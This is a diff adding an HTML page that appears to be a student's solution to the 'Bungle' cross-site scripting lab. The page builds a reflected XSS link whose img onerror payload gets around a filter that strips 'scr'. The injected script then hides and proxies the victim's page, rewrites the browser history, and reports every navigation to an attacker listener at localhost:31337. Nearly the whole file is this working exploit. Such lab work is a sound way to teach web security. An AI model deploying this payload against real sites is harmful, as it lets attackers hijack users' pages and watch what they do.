@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<title>Bungle XSS 3.1</title>
+</head>
+
+<body>
+
+	<h3 id="bungle-link"></h3>
+
+	<script>
+		// This function is serialized and executed in Bungle's origin through the XSS.
+		function payload(attacker) {
+			function log(data) {
+				console.log($.param(data));
+				$.get(attacker, data);
+			}
+
+			function proxy(href) {
+				$("html").load(href, function () {
+					window.history.replaceState(null, "", href);
+					$("html").show();
+					log({ event: "nav", uri: href });
+					$("#query").val("pwned!");
+				});
+			}
+
+			$("html").hide();
+			proxy("./");
+		}
+
+		// Build a payload that avoids the defense removing the substring "scr".
+		function makeLink(xssdefense, target, attacker) {
+			// img triggers onerror because the deliberately invalid source cannot load.
+			var injectedPayload = "<img src=x onerror='" +
+				payload.toString() +
+				";payload(\"" + attacker + "\")'>";
+
+			return target + "search?xssdefense=" + xssdefense +
+				"&q=" + encodeURIComponent(injectedPayload);
+		}
+
+		// Bungle reflects q; the listener receives the activity reported by the payload.
+		var target = "http://localhost/project2/";
+		var attacker = "http://localhost:31337/";
+		var url = makeLink(1, target, attacker);
+		var link = document.createElement("a");
+
+		link.href = url;
+		link.textContent = "Try Bungle!";
+		document.getElementById("bungle-link").appendChild(link);
+	</script>
+
+</body>
+
+</html>
